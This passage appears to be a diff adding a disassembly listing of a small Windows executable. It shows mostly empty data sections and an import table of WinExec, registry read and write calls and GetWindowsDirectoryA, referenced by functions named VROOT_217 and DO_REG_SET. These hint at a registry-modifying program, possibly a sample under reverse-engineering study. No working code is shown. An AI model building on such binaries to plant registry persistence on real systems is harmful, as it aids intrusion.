+seg001:0040231D			db    0	;  
+seg001:0040231E			db    0	;  
+seg001:0040231F			db    0	;  
+seg001:00402320			db    0	;  
+seg001:00402321			db    0	;  
+seg001:00402322			db    0	;  
+seg001:00402323			db    0	;  
+seg001:00402324			db    0	;  
+seg001:00402325			db    0	;  
+seg001:00402326			db    0	;  
+seg001:00402327			db    0	;  
+seg001:00402328			db    0	;  
+seg001:00402329			db    0	;  
+seg001:0040232A			db    0	;  
+seg001:0040232B			db    0	;  
+seg001:0040232C			db    0	;  
+seg001:0040232D			db    0	;  
+seg001:0040232E			db    0	;  
+seg001:0040232F			db    0	;  
+seg001:00402330			db    0	;  
+seg001:00402331			db    0	;  
+seg001:00402332			db    0	;  
+seg001:00402333			db    0	;  
+seg001:00402334			db    0	;  
+seg001:00402335			db    0	;  
+seg001:00402336			db    0	;  
+seg001:00402337			db    0	;  
+seg001:00402338			db    0	;  
+seg001:00402339			db    0	;  
+seg001:0040233A			db    0	;  
+seg001:0040233B			db    0	;  
+seg001:0040233C			db    0	;  
+seg001:0040233D			db    0	;  
+seg001:0040233E			db    0	;  
+seg001:0040233F			db    0	;  
+seg001:00402340			db    0	;  
+seg001:00402341			db    0	;  
+seg001:00402342			db    0	;  
+seg001:00402343			db    0	;  
+seg001:00402344			db    0	;  
+seg001:00402345			db    0	;  
+seg001:00402346			db    0	;  
+seg001:00402347			db    0	;  
+seg001:00402348			db    0	;  
+seg001:00402349			db    0	;  
+seg001:0040234A			db    0	;  
+seg001:0040234B			db    0	;  
+seg001:0040234C			db    0	;  
+seg001:0040234D			db    0	;  
+seg001:0040234E			db    0	;  
+seg001:0040234F			db    0	;  
+seg001:00402350			db    0	;  
+seg001:00402351			db    0	;  
+seg001:00402352			db    0	;  
+seg001:00402353			db    0	;  
+seg001:00402354			db    0	;  
+seg001:00402355			db    0	;  
+seg001:00402356			db    0	;  
+seg001:00402357			db    0	;  
+seg001:00402358			db    0	;  
+seg001:00402359			db    0	;  
+seg001:0040235A			db    0	;  
+seg001:0040235B			db    0	;  
+seg001:0040235C			db    0	;  
+seg001:0040235D			db    0	;  
+seg001:0040235E			db    0	;  
+seg001:0040235F			db    0	;  
+seg001:00402360			db    0	;  
+seg001:00402361			db    0	;  
+seg001:00402362			db    0	;  
+seg001:00402363			db    0	;  
+seg001:00402364			db    0	;  
+seg001:00402365			db    0	;  
+seg001:00402366			db    0	;  
+seg001:00402367			db    0	;  
+seg001:00402368			db    0	;  
+seg001:00402369			db    0	;  
+seg001:0040236A			db    0	;  
+seg001:0040236B			db    0	;  
+seg001:0040236C			db    0	;  
+seg001:0040236D			db    0	;  
+seg001:0040236E			db    0	;  
+seg001:0040236F			db    0	;  
+seg001:00402370			db    0	;  
+seg001:00402371			db    0	;  
+seg001:00402372			db    0	;  
+seg001:00402373			db    0	;  
+seg001:00402374			db    0	;  
+seg001:00402375			db    0	;  
+seg001:00402376			db    0	;  
+seg001:00402377			db    0	;  
+seg001:00402378			db    0	;  
+seg001:00402379			db    0	;  
+seg001:0040237A			db    0	;  
+seg001:0040237B			db    0	;  
+seg001:0040237C			db    0	;  
+seg001:0040237D			db    0	;  
+seg001:0040237E			db    0	;  
+seg001:0040237F			db    0	;  
+seg001:00402380			db    0	;  
+seg001:00402381			db    0	;  
+seg001:00402382			db    0	;  
+seg001:00402383			db    0	;  
+seg001:00402384			db    0	;  
+seg001:00402385			db    0	;  
+seg001:00402386			db    0	;  
+seg001:00402387			db    0	;  
+seg001:00402388			db    0	;  
+seg001:00402389			db    0	;  
+seg001:0040238A			db    0	;  
+seg001:0040238B			db    0	;  
+seg001:0040238C			db    0	;  
+seg001:0040238D			db    0	;  
+seg001:0040238E			db    0	;  
+seg001:0040238F			db    0	;  
+seg001:00402390			db    0	;  
+seg001:00402391			db    0	;  
+seg001:00402392			db    0	;  
+seg001:00402393			db    0	;  
+seg001:00402394			db    0	;  
+seg001:00402395			db    0	;  
+seg001:00402396			db    0	;  
+seg001:00402397			db    0	;  
+seg001:00402398			db    0	;  
+seg001:00402399			db    0	;  
+seg001:0040239A			db    0	;  
+seg001:0040239B			db    0	;  
+seg001:0040239C			db    0	;  
+seg001:0040239D			db    0	;  
+seg001:0040239E			db    0	;  
+seg001:0040239F			db    0	;  
+seg001:004023A0			db    0	;  
+seg001:004023A1			db    0	;  
+seg001:004023A2			db    0	;  
+seg001:004023A3			db    0	;  
+seg001:004023A4			db    0	;  
+seg001:004023A5			db    0	;  
+seg001:004023A6			db    0	;  
+seg001:004023A7			db    0	;  
+seg001:004023A8			db    0	;  
+seg001:004023A9			db    0	;  
+seg001:004023AA			db    0	;  
+seg001:004023AB			db    0	;  
+seg001:004023AC			db    0	;  
+seg001:004023AD			db    0	;  
+seg001:004023AE			db    0	;  
+seg001:004023AF			db    0	;  
+seg001:004023B0			db    0	;  
+seg001:004023B1			db    0	;  
+seg001:004023B2			db    0	;  
+seg001:004023B3			db    0	;  
+seg001:004023B4			db    0	;  
+seg001:004023B5			db    0	;  
+seg001:004023B6			db    0	;  
+seg001:004023B7			db    0	;  
+seg001:004023B8			db    0	;  
+seg001:004023B9			db    0	;  
+seg001:004023BA			db    0	;  
+seg001:004023BB			db    0	;  
+seg001:004023BC			db    0	;  
+seg001:004023BD			db    0	;  
+seg001:004023BE			db    0	;  
+seg001:004023BF			db    0	;  
+seg001:004023C0			db    0	;  
+seg001:004023C1			db    0	;  
+seg001:004023C2			db    0	;  
+seg001:004023C3			db    0	;  
+seg001:004023C4			db    0	;  
+seg001:004023C5			db    0	;  
+seg001:004023C6			db    0	;  
+seg001:004023C7			db    0	;  
+seg001:004023C8			db    0	;  
+seg001:004023C9			db    0	;  
+seg001:004023CA			db    0	;  
+seg001:004023CB			db    0	;  
+seg001:004023CC			db    0	;  
+seg001:004023CD			db    0	;  
+seg001:004023CE			db    0	;  
+seg001:004023CF			db    0	;  
+seg001:004023D0			db    0	;  
+seg001:004023D1			db    0	;  
+seg001:004023D2			db    0	;  
+seg001:004023D3			db    0	;  
+seg001:004023D4			db    0	;  
+seg001:004023D5			db    0	;  
+seg001:004023D6			db    0	;  
+seg001:004023D7			db    0	;  
+seg001:004023D8			db    0	;  
+seg001:004023D9			db    0	;  
+seg001:004023DA			db    0	;  
+seg001:004023DB			db    0	;  
+seg001:004023DC			db    0	;  
+seg001:004023DD			db    0	;  
+seg001:004023DE			db    0	;  
+seg001:004023DF			db    0	;  
+seg001:004023E0			db    0	;  
+seg001:004023E1			db    0	;  
+seg001:004023E2			db    0	;  
+seg001:004023E3			db    0	;  
+seg001:004023E4			db    0	;  
+seg001:004023E5			db    0	;  
+seg001:004023E6			db    0	;  
+seg001:004023E7			db    0	;  
+seg001:004023E8			db    0	;  
+seg001:004023E9			db    0	;  
+seg001:004023EA			db    0	;  
+seg001:004023EB			db    0	;  
+seg001:004023EC			db    0	;  
+seg001:004023ED			db    0	;  
+seg001:004023EE			db    0	;  
+seg001:004023EF			db    0	;  
+seg001:004023F0			db    0	;  
+seg001:004023F1			db    0	;  
+seg001:004023F2			db    0	;  
+seg001:004023F3			db    0	;  
+seg001:004023F4			db    0	;  
+seg001:004023F5			db    0	;  
+seg001:004023F6			db    0	;  
+seg001:004023F7			db    0	;  
+seg001:004023F8			db    0	;  
+seg001:004023F9			db    0	;  
+seg001:004023FA			db    0	;  
+seg001:004023FB			db    0	;  
+seg001:004023FC			db    0	;  
+seg001:004023FD			db    0	;  
+seg001:004023FE			db    0	;  
+seg001:004023FF			db    0	;  
+seg001:00402400			db ? ; unexplored
+seg001:00402401			db ? ; unexplored
+seg001:00402402			db ? ; unexplored
+seg001:00402403			db ? ; unexplored
+seg001:00402404			db ? ; unexplored
+seg001:00402405			db ? ; unexplored
+seg001:00402406			db ? ; unexplored
+seg001:00402407			db ? ; unexplored
+seg001:00402408			db ? ; unexplored
+seg001:00402409			db ? ; unexplored
+seg001:0040240A			db ? ; unexplored
+seg001:0040240B			db ? ; unexplored
+seg001:0040240C			db ? ; unexplored
+seg001:0040240D			db ? ; unexplored
+seg001:0040240E			db ? ; unexplored
+seg001:0040240F			db ? ; unexplored
+seg001:00402410			db ? ; unexplored
+seg001:00402411			db ? ; unexplored
+seg001:00402412			db ? ; unexplored
+seg001:00402413			db ? ; unexplored
+seg001:00402414			db ? ; unexplored
+seg001:00402415			db ? ; unexplored
+seg001:00402416			db ? ; unexplored
+seg001:00402417			db ? ; unexplored
+seg001:00402418			db ? ; unexplored
+seg001:00402419			db ? ; unexplored
+seg001:0040241A			db ? ; unexplored
+seg001:0040241B			db ? ; unexplored
+seg001:0040241C			db ? ; unexplored
+seg001:0040241D			db ? ; unexplored
+seg001:0040241E			db ? ; unexplored
+seg001:0040241F			db ? ; unexplored
+seg001:00402420			db ? ; unexplored
+seg001:00402421			db ? ; unexplored
+seg001:00402422			db ? ; unexplored
+seg001:00402423			db ? ; unexplored
+seg001:00402424			db ? ; unexplored
+seg001:00402425			db ? ; unexplored
+seg001:00402426			db ? ; unexplored
+seg001:00402427			db ? ; unexplored
+seg001:00402428			db ? ; unexplored
+seg001:00402429			db ? ; unexplored
+seg001:0040242A			db ? ; unexplored
+seg001:0040242B			db ? ; unexplored
+seg001:0040242C			db ? ; unexplored
+seg001:0040242D			db ? ; unexplored
+seg001:0040242E			db ? ; unexplored
+seg001:0040242F			db ? ; unexplored
+seg001:00402430			db ? ; unexplored
+seg001:00402431			db ? ; unexplored
+seg001:00402432			db ? ; unexplored
+seg001:00402433			db ? ; unexplored
+seg001:00402434			db ? ; unexplored
+seg001:00402435			db ? ; unexplored
+seg001:00402436			db ? ; unexplored
+seg001:00402437			db ? ; unexplored
+seg001:00402438			db ? ; unexplored
+seg001:00402439			db ? ; unexplored
+seg001:0040243A			db ? ; unexplored
+seg001:0040243B			db ? ; unexplored
+seg001:0040243C			db ? ; unexplored
+seg001:0040243D			db ? ; unexplored
+seg001:0040243E			db ? ; unexplored
+seg001:0040243F			db ? ; unexplored
+seg001:00402440			db ? ; unexplored
+seg001:00402441			db ? ; unexplored
+seg001:00402442			db ? ; unexplored
+seg001:00402443			db ? ; unexplored
+seg001:00402444			db ? ; unexplored
+seg001:00402445			db ? ; unexplored
+seg001:00402446			db ? ; unexplored
+seg001:00402447			db ? ; unexplored
+seg001:00402448			db ? ; unexplored
+seg001:00402449			db ? ; unexplored
+seg001:0040244A			db ? ; unexplored
+seg001:0040244B			db ? ; unexplored
+seg001:0040244C			db ? ; unexplored
+seg001:0040244D			db ? ; unexplored
+seg001:0040244E			db ? ; unexplored
+seg001:0040244F			db ? ; unexplored
+seg001:00402450			db ? ; unexplored
+seg001:00402451			db ? ; unexplored
+seg001:00402452			db ? ; unexplored
+seg001:00402453			db ? ; unexplored
+seg001:00402454			db ? ; unexplored
+seg001:00402455			db ? ; unexplored
+seg001:00402456			db ? ; unexplored
+seg001:00402457			db ? ; unexplored
+seg001:00402458			db ? ; unexplored
+seg001:00402459			db ? ; unexplored
+seg001:0040245A			db ? ; unexplored
+seg001:0040245B			db ? ; unexplored
+seg001:0040245C			db ? ; unexplored
+seg001:0040245D			db ? ; unexplored
+seg001:0040245E			db ? ; unexplored
+seg001:0040245F			db ? ; unexplored
+seg001:00402460			db ? ; unexplored
+seg001:00402461			db ? ; unexplored
+seg001:00402462			db ? ; unexplored
+seg001:00402463			db ? ; unexplored
+seg001:00402464			db ? ; unexplored
+seg001:00402465			db ? ; unexplored
+seg001:00402466			db ? ; unexplored
+seg001:00402467			db ? ; unexplored
+seg001:00402468			db ? ; unexplored
+seg001:00402469			db ? ; unexplored
+seg001:0040246A			db ? ; unexplored
+seg001:0040246B			db ? ; unexplored
+seg001:0040246C			db ? ; unexplored
+seg001:0040246D			db ? ; unexplored
+seg001:0040246E			db ? ; unexplored
+seg001:0040246F			db ? ; unexplored
+seg001:00402470			db ? ; unexplored
+seg001:00402471			db ? ; unexplored
+seg001:00402472			db ? ; unexplored
+seg001:00402473			db ? ; unexplored
+seg001:00402474			db ? ; unexplored
+seg001:00402475			db ? ; unexplored
+seg001:00402476			db ? ; unexplored
+seg001:00402477			db ? ; unexplored
+seg001:00402478			db ? ; unexplored
+seg001:00402479			db ? ; unexplored
+seg001:0040247A			db ? ; unexplored
+seg001:0040247B			db ? ; unexplored
+seg001:0040247C			db ? ; unexplored
+seg001:0040247D			db ? ; unexplored
+seg001:0040247E			db ? ; unexplored
+seg001:0040247F			db ? ; unexplored
+seg001:00402480			db ? ; unexplored
+seg001:00402481			db ? ; unexplored
+seg001:00402482			db ? ; unexplored
+seg001:00402483			db ? ; unexplored
+seg001:00402484			db ? ; unexplored
+seg001:00402485			db ? ; unexplored
+seg001:00402486			db ? ; unexplored
+seg001:00402487			db ? ; unexplored
+seg001:00402488			db ? ; unexplored
+seg001:00402489			db ? ; unexplored
+seg001:0040248A			db ? ; unexplored
+seg001:0040248B			db ? ; unexplored
+seg001:0040248C			db ? ; unexplored
+seg001:0040248D			db ? ; unexplored
+seg001:0040248E			db ? ; unexplored
+seg001:0040248F			db ? ; unexplored
+seg001:00402490			db ? ; unexplored
+seg001:00402491			db ? ; unexplored
+seg001:00402492			db ? ; unexplored
+seg001:00402493			db ? ; unexplored
+seg001:00402494			db ? ; unexplored
+seg001:00402495			db ? ; unexplored
+seg001:00402496			db ? ; unexplored
+seg001:00402497			db ? ; unexplored
+seg001:00402498			db ? ; unexplored
+seg001:00402499			db ? ; unexplored
+seg001:0040249A			db ? ; unexplored
+seg001:0040249B			db ? ; unexplored
+seg001:0040249C			db ? ; unexplored
+seg001:0040249D			db ? ; unexplored
+seg001:0040249E			db ? ; unexplored
+seg001:0040249F			db ? ; unexplored
+seg001:004024A0			db ? ; unexplored
+seg001:004024A1			db ? ; unexplored
+seg001:004024A2			db ? ; unexplored
+seg001:004024A3			db ? ; unexplored
+seg001:004024A4			db ? ; unexplored
+seg001:004024A5			db ? ; unexplored
+seg001:004024A6			db ? ; unexplored
+seg001:004024A7			db ? ; unexplored
+seg001:004024A8			db ? ; unexplored
+seg001:004024A9			db ? ; unexplored
+seg001:004024AA			db ? ; unexplored
+seg001:004024AB			db ? ; unexplored
+seg001:004024AC			db ? ; unexplored
+seg001:004024AD			db ? ; unexplored
+seg001:004024AE			db ? ; unexplored
+seg001:004024AF			db ? ; unexplored
+seg001:004024B0			db ? ; unexplored
+seg001:004024B1			db ? ; unexplored
+seg001:004024B2			db ? ; unexplored
+seg001:004024B3			db ? ; unexplored
+seg001:004024B4			db ? ; unexplored
+seg001:004024B5			db ? ; unexplored
+seg001:004024B6			db ? ; unexplored
+seg001:004024B7			db ? ; unexplored
+seg001:004024B8			db ? ; unexplored
+seg001:004024B9			db ? ; unexplored
+seg001:004024BA			db ? ; unexplored
+seg001:004024BB			db ? ; unexplored
+seg001:004024BC			db ? ; unexplored
+seg001:004024BD			db ? ; unexplored
+seg001:004024BE			db ? ; unexplored
+seg001:004024BF			db ? ; unexplored
+seg001:004024C0			db ? ; unexplored
+seg001:004024C1			db ? ; unexplored
+seg001:004024C2			db ? ; unexplored
+seg001:004024C3			db ? ; unexplored
+seg001:004024C4			db ? ; unexplored
+seg001:004024C5			db ? ; unexplored
+seg001:004024C6			db ? ; unexplored
+seg001:004024C7			db ? ; unexplored
+seg001:004024C8			db ? ; unexplored
+seg001:004024C9			db ? ; unexplored
+seg001:004024CA			db ? ; unexplored
+seg001:004024CB			db ? ; unexplored
+seg001:004024CC			db ? ; unexplored
+seg001:004024CD			db ? ; unexplored
+seg001:004024CE			db ? ; unexplored
+seg001:004024CF			db ? ; unexplored
+seg001:004024D0	; DWORD	cbData
+seg001:004024D0	cbData		dd ?			; DATA XREF: VROOT_217w
+seg001:004024D0						; VROOT_217+Ao	...
+seg001:004024D4	unk_4024D4	db ? ; unexplored	; DATA XREF: VROOT_217+14o
+seg001:004024D5			db ? ; unexplored
+seg001:004024D6			db ? ; unexplored
+seg001:004024D7			db ? ; unexplored
+seg001:004024D8	; HKEY hKey
+seg001:004024D8	hKey		dd ?			; DATA XREF: DO_REG_SETo
+seg001:004024D8						; DO_REG_SET+2Fr ...
+seg001:004024DC			align 1000h
+seg001:004024DC	seg001		ends
+seg001:004024DC	
+seg002:00403000	; Section 3. (virtual address 00003000)
+seg002:00403000	; Virtual size			: 00001000 (   4096.)
+seg002:00403000	; Section size in file		: 00000400 (   1024.)
+seg002:00403000	; Offset to raw	data for section: 00001000
+seg002:00403000	; Flags	C0000040: Data Readable	Writable
+seg002:00403000	; Alignment	: 16 bytes ?
+seg002:00403000	; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
+seg002:00403000	
+seg002:00403000	seg002		segment	para public 'DATA' use32
+seg002:00403000			assume cs:seg002
+seg002:00403000			;org 403000h
+seg002:00403000			db  3Ch	; <
+seg002:00403001			db  30h	; 0
+seg002:00403002			db    0	;  
+seg002:00403003			db    0	;  
+seg002:00403004			db    0	;  
+seg002:00403005			db    0	;  
+seg002:00403006			db    0	;  
+seg002:00403007			db    0	;  
+seg002:00403008			db    0	;  
+seg002:00403009			db    0	;  
+seg002:0040300A			db    0	;  
+seg002:0040300B			db    0	;  
+seg002:0040300C			db  84h	; 
+seg002:0040300D			db  30h	; 0
+seg002:0040300E			db    0	;  
+seg002:0040300F			db    0	;  
+seg002:00403010			db  60h	; `
+seg002:00403011			db  30h	; 0
+seg002:00403012			db    0	;  
+seg002:00403013			db    0	;  
+seg002:00403014			db  4Ch	; L
+seg002:00403015			db  30h	; 0
+seg002:00403016			db    0	;  
+seg002:00403017			db    0	;  
+seg002:00403018			db    0	;  
+seg002:00403019			db    0	;  
+seg002:0040301A			db    0	;  
+seg002:0040301B			db    0	;  
+seg002:0040301C			db    0	;  
+seg002:0040301D			db    0	;  
+seg002:0040301E			db    0	;  
+seg002:0040301F			db    0	;  
+seg002:00403020			db  91h	; ‘
+seg002:00403021			db  30h	; 0
+seg002:00403022			db    0	;  
+seg002:00403023			db    0	;  
+seg002:00403024			db  70h	; p
+seg002:00403025			db  30h	; 0
+seg002:00403026			db    0	;  
+seg002:00403027			db    0	;  
+seg002:00403028			db    0	;  
+seg002:00403029			db    0	;  
+seg002:0040302A			db    0	;  
+seg002:0040302B			db    0	;  
+seg002:0040302C			db    0	;  
+seg002:0040302D			db    0	;  
+seg002:0040302E			db    0	;  
+seg002:0040302F			db    0	;  
+seg002:00403030			db    0	;  
+seg002:00403031			db    0	;  
+seg002:00403032			db    0	;  
+seg002:00403033			db    0	;  
+seg002:00403034			db    0	;  
+seg002:00403035			db    0	;  
+seg002:00403036			db    0	;  
+seg002:00403037			db    0	;  
+seg002:00403038			db    0	;  
+seg002:00403039			db    0	;  
+seg002:0040303A			db    0	;  
+seg002:0040303B			db    0	;  
+seg002:0040303C			db  9Eh	; 
+seg002:0040303D			db  30h	; 0
+seg002:0040303E			db    0	;  
+seg002:0040303F			db    0	;  
+seg002:00403040			db 0A6h	; ฆ
+seg002:00403041			db  30h	; 0
+seg002:00403042			db    0	;  
+seg002:00403043			db    0	;  
+seg002:00403044			db 0BEh	; พ
+seg002:00403045			db  30h	; 0
+seg002:00403046			db    0	;  
+seg002:00403047			db    0	;  
+seg002:00403048			db    0	;  
+seg002:00403049			db    0	;  
+seg002:0040304A			db    0	;  
+seg002:0040304B			db    0	;  
+seg002:0040304C			db 0C8h	; ศ
+seg002:0040304D			db  30h	; 0
+seg002:0040304E			db    0	;  
+seg002:0040304F			db    0	;  
+seg002:00403050			db 0DCh	; Ü
+seg002:00403051			db  30h	; 0
+seg002:00403052			db    0	;  
+seg002:00403053			db    0	;  
+seg002:00403054			db 0EEh	; ๎
+seg002:00403055			db  30h	; 0
+seg002:00403056			db    0	;  
+seg002:00403057			db    0	;  
+seg002:00403058			db 0FEh	; þ
+seg002:00403059			db  30h	; 0
+seg002:0040305A			db    0	;  
+seg002:0040305B			db    0	;  
+seg002:0040305C			db    0	;  
+seg002:0040305D			db    0	;  
+seg002:0040305E			db    0	;  
+seg002:0040305F			db    0	;  
+seg002:0040305F	seg002		ends
+seg002:0040305F	
+.idata:00403060	; 
+.idata:00403060	; Imports from KERNEL32.dll
+.idata:00403060	; 
+.idata:00403060	; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
+.idata:00403060	
+.idata:00403060	; _idata
+.idata:00403060	; void __stdcall __imp_Sleep(DWORD dwMilliseconds)
+.idata:00403060			extrn __imp_Sleep:dword	; DATA XREF: Sleepr
+.idata:00403064	; UINT __stdcall __imp_GetWindowsDirectoryA(LPSTR lpBuffer,UINT	uSize)
+.idata:00403064			extrn __imp_GetWindowsDirectoryA:dword
+.idata:00403064						; DATA XREF: GetWindowsDirectoryAr
+.idata:00403068	; UINT __stdcall __imp_WinExec(LPCSTR lpCmdLine,UINT uCmdShow)
+.idata:00403068			extrn __imp_WinExec:dword ; DATA XREF: WinExecr
+.idata:0040306C	
+.idata:00403070	; 
+.idata:00403070	; Imports from ADVAPI32.dll
+.idata:00403070	; 
+.idata:00403070	; LONG __stdcall __imp_RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD	lpType,LPBYTE lpData,LPDWORD lpcbData)
+.idata:00403070			extrn __imp_RegQueryValueExA:dword
+.idata:00403070						; DATA XREF: RegQueryValueExAr
+.idata:00403074	; LONG __stdcall __imp_RegSetValueExA(HKEY hKey,LPCSTR lpValueName,DWORD Reserved,DWORD	dwType,const BYTE *lpData,DWORD	cbData)
+.idata:00403074			extrn __imp_RegSetValueExA:dword
+.idata:00403074						; DATA XREF: RegSetValueExAr
+.idata:00403078	; LONG __stdcall __imp_RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult)
+.idata:00403078			extrn __imp_RegOpenKeyExA:dword	; DATA XREF: RegOpenKeyExAr
+.idata:0040307C	; LONG __stdcall __imp_RegCloseKey(HKEY	hKey)
+.idata:0040307C			extrn __imp_RegCloseKey:dword ;	DATA XREF: RegCloseKeyr
+.idata:00403080	
+.idata:00403080	
+seg004:00403084	; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
+seg004:00403084	
+seg004:00403084	seg004		segment	para public 'DATA' use32
+seg004:00403084			assume cs:seg004
+seg004:00403084			;org 403084h
+seg004:00403084	aKernel32_dll	db 'KERNEL32.dll',0
+seg004:00403091	aAdvapi32_dll	db 'ADVAPI32.dll',0
+seg004:0040309E			align 4
+seg004:004030A0	aSleep		db 'Sleep',0
+seg004:004030A6			align 4
+seg004:004030A8	aGetwindowsdire	db 'GetWindowsDirectoryA',0
+seg004:004030BD			align 4
+seg004:004030C0	aWinexec	db 'WinExec',0
+seg004:004030C8			db    0	;  
+seg004:004030C9			db    0	;  
+seg004:004030CA	aRegqueryvaluee	db 'RegQueryValueExA',0
+seg004:004030DB			db    0	;  
+seg004:004030DC			db    0	;  
+seg004:004030DD			db    0	;  
+seg004:004030DE	aRegsetvalueexa	db 'RegSetValueExA',0
+seg004:004030ED			db    0	;  
+seg004:004030EE			db    0	;  
+seg004:004030EF			db    0	;  
+seg004:004030F0	aRegopenkeyexa	db 'RegOpenKeyExA',0
+seg004:004030FE			db    0	;  
+seg004:004030FF			db    0	;  
+seg004:00403100	aRegclosekey	db 'RegCloseKey',0
+seg004:0040310C			db    0	;  
+seg004:0040310D			db    0	;  
+seg004:0040310E			db    0	;  
+seg004:0040310F			db    0	;  
+seg004:00403110			db    0	;  
+seg004:00403111			db    0	;  
+seg004:00403112			db    0	;  
+seg004:00403113			db    0	;  
+seg004:00403114			db    0	;  
+seg004:00403115			db    0	;  
+seg004:00403116			db    0	;  
+seg004:00403117			db    0	;  
+seg004:00403118			db    0	;  
+seg004:00403119			db    0	;  
+seg004:0040311A			db    0	;  
+seg004:0040311B			db    0	;  
+seg004:0040311C			db    0	;  
+seg004:0040311D			db    0	;  
+seg004:0040311E			db    0	;  
+seg004:0040311F			db    0	;  
+seg004:00403120			db    0	;  
+seg004:00403121			db    0	;  
+seg004:00403122			db    0	;  
+seg004:00403123			db    0	;  
+seg004:00403124			db    0	;  
+seg004:00403125			db    0	;  
+seg004:00403126			db    0	;  
+seg004:00403127			db    0	;  
+seg004:00403128			db    0	;  
+seg004:00403129			db    0	;  
+seg004:0040312A			db    0	;  
+seg004:0040312B			db    0	;  
+seg004:0040312C			db    0	;  
+seg004:0040312D			db    0	;  
+seg004:0040312E			db    0	;  
+seg004:0040312F			db    0	;  
+seg004:00403130			db    0	;  
+seg004:00403131			db    0	;  
+seg004:00403132			db    0	;  
+seg004:00403133			db    0	;  
+seg004:00403134			db    0	;  
+seg004:00403135			db    0	;  
+seg004:00403136			db    0	;  
+seg004:00403137			db    0	;  
+seg004:00403138			db    0	;  
+seg004:00403139			db    0	;  
+seg004:0040313A			db    0	;  
+seg004:0040313B			db    0	;  
+seg004:0040313C			db    0	;  
+seg004:0040313D			db    0	;  
+seg004:0040313E			db    0	;  
+seg004:0040313F			db    0	;  
+seg004:00403140			db    0	;  
+seg004:00403141			db    0	;  
+seg004:00403142			db    0	;  
+seg004:00403143			db    0	;  
+seg004:00403144			db    0	;  
+seg004:00403145			db    0	;  
+seg004:00403146			db    0	;  
+seg004:00403147			db    0	;  
+seg004:00403148			db    0	;  
+seg004:00403149			db    0	;  
+seg004:0040314A			db    0	;  
+seg004:0040314B			db    0	;  
+seg004:0040314C			db    0	;  
+seg004:0040314D			db    0	;  
+seg004:0040314E			db    0	;  
+seg004:0040314F			db    0	;  
+seg004:00403150			db    0	;  
+seg004:00403151			db    0	;  
+seg004:00403152			db    0	;  
+seg004:00403153			db    0	;  
+seg004:00403154			db    0	;  
+seg004:00403155			db    0	;  
+seg004:00403156			db    0	;  
+seg004:00403157			db    0	;  
+seg004:00403158			db    0	;  
+seg004:00403159			db    0	;  
+seg004:0040315A			db    0	;  
+seg004:0040315B			db    0	;  
+seg004:0040315C			db    0	;  
+seg004:0040315D			db    0	;  
+seg004:0040315E			db    0	;  
+seg004:0040315F			db    0	;  
+seg004:00403160			db    0	;  
+seg004:00403161			db    0	;  
+seg004:00403162			db    0	;  
+seg004:00403163			db    0	;  
+seg004:00403164			db    0	;  
+seg004:00403165			db    0	;  
+seg004:00403166			db    0	;  
+seg004:00403167			db    0	;  
+seg004:00403168			db    0	;  
+seg004:00403169			db    0	;  
+seg004:0040316A			db    0	;  
+seg004:0040316B			db    0	;  
+seg004:0040316C			db    0	;  
+seg004:0040316D			db    0	;  
+seg004:0040316E			db    0	;  
+seg004:0040316F			db    0	;  
+seg004:00403170			db    0	;  
+seg004:00403171			db    0	;  
+seg004:00403172			db    0	;  
+seg004:00403173			db    0	;  
+seg004:00403174			db    0	;  
+seg004:00403175			db    0	;  
+seg004:00403176			db    0	;  
+seg004:00403177			db    0	;  
+seg004:00403178			db    0	;  
+seg004:00403179			db    0	;  
+seg004:0040317A			db    0	;  
+seg004:0040317B			db    0	;  
+seg004:0040317C			db    0	;  
+seg004:0040317D			db    0	;  
+seg004:0040317E			db    0	;  
+seg004:0040317F			db    0	;  
+seg004:00403180			db    0	;  
+seg004:00403181			db    0	;  
+seg004:00403182			db    0	;  
+seg004:00403183			db    0	;  
+seg004:00403184			db    0	;  
+seg004:00403185			db    0	;  
+seg004:00403186			db    0	;  
+seg004:00403187			db    0	;  
+seg004:00403188			db    0	;  
+seg004:00403189			db    0	;  
+seg004:0040318A			db    0	;  
+seg004:0040318B			db    0	;  
+seg004:0040318C			db    0	;  
+seg004:0040318D			db    0	;  
+seg004:0040318E			db    0	;  
+seg004:0040318F			db    0	;  
+seg004:00403190			db    0	;  
+seg004:00403191			db    0	;  
+seg004:00403192			db    0	;  
+seg004:00403193			db    0	;  
+seg004:00403194			db    0	;  
+seg004:00403195			db    0	;  
+seg004:00403196			db    0	;  
+seg004:00403197			db    0	;  
+seg004:00403198			db    0	;  
+seg004:00403199			db    0	;  
+seg004:0040319A			db    0	;  
+seg004:0040319B			db    0	;  
+seg004:0040319C			db    0	;  
+seg004:0040319D			db    0	;  
+seg004:0040319E			db    0	;  
+seg004:0040319F			db    0	;  
+seg004:004031A0			db    0	;  
+seg004:004031A1			db    0	;  
+seg004:004031A2			db    0	;  
+seg004:004031A3			db    0	;  
+seg004:004031A4			db    0	;  
+seg004:004031A5			db    0	;  
+seg004:004031A6			db    0	;  
+seg004:004031A7			db    0	;  
+seg004:004031A8			db    0	;  
+seg004:004031A9			db    0	;  
+seg004:004031AA			db    0	;  
+seg004:004031AB			db    0	;  
+seg004:004031AC			db    0	;  
+seg004:004031AD			db    0	;  
+seg004:004031AE			db    0	;  
+seg004:004031AF			db    0	;  
+seg004:004031B0			db    0	;  
+seg004:004031B1			db    0	;  
+seg004:004031B2			db    0	;  
+seg004:004031B3			db    0	;  
+seg004:004031B4			db    0	;  
+seg004:004031B5			db    0	;  
+seg004:004031B6			db    0	;  
+seg004:004031B7			db    0	;  
+seg004:004031B8			db    0	;  
+seg004:004031B9			db    0	;  
+seg004:004031BA			db    0	;  
+seg004:004031BB			db    0	;  
+seg004:004031BC			db    0	;  
+seg004:004031BD			db    0	;  
+seg004:004031BE			db    0	;  
+seg004:004031BF			db    0	;  
+seg004:004031C0			db    0	;  
+seg004:004031C1			db    0	;  
+seg004:004031C2			db    0	;  
+seg004:004031C3			db    0	;  
+seg004:004031C4			db    0	;  
+seg004:004031C5			db    0	;  
+seg004:004031C6			db    0	;  
+seg004:004031C7			db    0	;  
+seg004:004031C8			db    0	;  
+seg004:004031C9			db    0	;  
+seg004:004031CA			db    0	;  
+seg004:004031CB			db    0	;  
+seg004:004031CC			db    0	;  
+seg004:004031CD			db    0	;  
+seg004:004031CE			db    0	;  
+seg004:004031CF			db    0	;  
